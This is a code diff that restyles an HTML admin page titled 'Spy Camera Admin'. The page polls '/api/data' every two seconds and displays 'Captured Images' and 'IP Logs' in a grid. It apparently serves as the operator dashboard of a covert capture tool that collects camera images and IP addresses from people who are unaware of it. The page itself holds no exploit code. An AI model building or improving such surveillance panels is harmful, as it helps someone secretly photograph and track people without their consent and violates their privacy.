@@ -1,46 +1,317 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Admin</title>
+    <title>Admin - Captures</title>
     <style>
-        body {
-            background:#111;
-            color:white;
-            padding:20px;
-            font-family:Arial;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        img {
-            max-width:300px;
-            margin:10px;
+
+        body {
+            background: linear-gradient(135deg, #0a0e27, #1a1f3a);
+            color: white;
+            padding: 30px;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            border-bottom: 2px solid #ffd700;
+            padding-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 48px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .stats {
+            font-size: 18px;
+            color: #06ffa5;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        /* Images Section */
+        .images-section {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .section-title {
+            font-size: 28px;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+            border-bottom: 2px solid #ffd700;
+            padding-bottom: 10px;
+        }
+
+        #images {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 20px;
+            background: rgba(20, 25, 45, 0.5);
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #3a86ff;
+            min-height: 300px;
+        }
+
+        .image-card {
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+            background: #000;
+            border: 2px solid #06ffa5;
+            box-shadow: 0 0 15px rgba(3, 255, 165, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .image-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(3, 255, 165, 0.4);
+            border-color: #ffd700;
+        }
+
+        .image-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .image-card.loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 200px;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(3, 255, 165, 0.3);
+            border-top-color: #06ffa5;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .empty-state {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 60px 20px;
+            color: #888;
+            font-size: 18px;
+        }
+
+        /* Logs Section */
+        .logs-section {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            height: 100%;
+        }
+
+        #logs {
+            background: rgba(20, 25, 45, 0.5);
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #ff006e;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            max-height: 600px;
+            overflow-y: auto;
+            line-height: 1.6;
+            color: #06ffa5;
+            flex: 1;
+        }
+
+        .log-entry {
+            padding: 8px;
+            border-left: 3px solid #ffd700;
+            margin-bottom: 5px;
+            background: rgba(255, 215, 0, 0.05);
+        }
+
+        /* Scrollbar styling */
+        #logs::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        #logs::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+        }
+
+        #logs::-webkit-scrollbar-thumb {
+            background: #06ffa5;
+            border-radius: 4px;
+        }
+
+        #logs::-webkit-scrollbar-thumb:hover {
+            background: #ffd700;
+        }
+
+        /* Controls */
+        .controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            color: black;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+
+            #images {
+                grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            }
+        }
+
+        .no-images {
+            text-align: center;
+            padding: 40px;
+            color: #888;
         }
     </style>
 </head>
 <body>
 
-<h1>📡 Captures + IP Logs</h1>
+<div class="header">
+    <h1>📡 Spy Camera Admin</h1>
+    <div class="stats">
+        <span id="imageCount">Images: 0</span> | 
+        <span id="logCount">Logs: 0</span>
+    </div>
+</div>
 
-<div id="images"></div>
-<pre id="logs"></pre>
+<div class="container">
+    <div class="images-section">
+        <div class="section-title">📸 Captured Images</div>
+        <div id="images"></div>
+        <div class="controls">
+            <button class="btn" onclick="refreshData()">🔄 Refresh</button>
+            <button class="btn" onclick="downloadAll()">📥 Download All</button>
+        </div>
+    </div>
+
+    <div class="logs-section">
+        <div class="section-title">📋 IP Logs</div>
+        <div id="logs"></div>
+    </div>
+</div>
 
 <script>
 async function load() {
-    const res = await fetch('/api/data');
-    const data = await res.json();
+    try {
+        const res = await fetch('/api/data');
+        const data = await res.json();
 
-    const imgDiv = document.getElementById('images');
-    imgDiv.innerHTML = "";
+        // Display images
+        const imgDiv = document.getElementById('images');
+        imgDiv.innerHTML = "";
 
-    data.files.forEach(f => {
-        const img = document.createElement('img');
-        img.src = "/captures/" + f + "?" + Date.now();
-        imgDiv.appendChild(img);
-    });
+        if (data.files && data.files.length > 0) {
+            data.files.forEach(f => {
+                const card = document.createElement('div');
+                card.className = 'image-card loading';
+                
+                const img = document.createElement('img');
+                img.onload = () => {
+                    card.classList.remove('loading');
+                };
+                img.onerror = () => {
+                    card.classList.remove('loading');
+                    card.innerHTML = '<span style="color: red;">❌ Failed to load</span>';
+                };
+                img.src = "/captures/" + encodeURIComponent(f) + "?" + Date.now();
+                
+                card.appendChild(img);
+                imgDiv.appendChild(card);
+            });
+        } else {
+            imgDiv.innerHTML = '<div class="empty-state">No images captured yet</div>';
+        }
 
-    document.getElementById('logs').innerText = data.logs.join("");
+        // Update image count
+        document.getElementById('imageCount').innerText = 'Images: ' + (data.files ? data.files.length : 0);
+
+        // Display logs
+        const logsDiv = document.getElementById('logs');
+        logsDiv.innerHTML = "";
+
+        if (data.logs && data.logs.length > 0) {
+            data.logs.forEach(log => {
+                const logEntry = document.createElement('div');
+                logEntry.className = 'log-entry';
+                logEntry.innerText = log.trim();
+                logsDiv.appendChild(logEntry);
+            });
+        } else {
+            logsDiv.innerHTML = '<div class="no-images">No logs yet</div>';
+        }
+
+        // Update log count
+        document.getElementById('logCount').innerText = 'Logs: ' + (data.logs ? data.logs.length : 0);
+
+    } catch (e) {
+        console.error("Failed to load data:", e);
+        document.getElementById('images').innerHTML = '<div class="empty-state">Error loading data</div>';
+    }
 }
 
-setInterval(load, 3000);
+function refreshData() {
+    load();
+}
+
+function downloadAll() {
+    alert("Download feature coming soon!");
+}
+
+// Load initially
 load();
+
+// Auto-refresh every 2 seconds
+setInterval(load, 2000);
 </script>
 
 </body>
